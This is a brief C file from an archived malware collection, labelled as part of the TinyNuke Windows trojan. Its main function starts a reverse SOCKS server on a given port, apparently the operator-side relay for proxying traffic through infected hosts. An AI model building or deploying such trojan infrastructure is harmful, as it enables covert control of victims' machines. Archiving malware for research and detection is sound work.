/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include "Server.h"

int main(int argc, char **argv)
{
   if(argc < 2)
      wprintf(L"Port not provided\n");
   else if(!ReverseSocksServer::Start(atoi(argv[1])))
      wprintf(L"Could not start the server (Error: %d)\n", WSAGetLastError()); 
   getchar();
   return 0;
}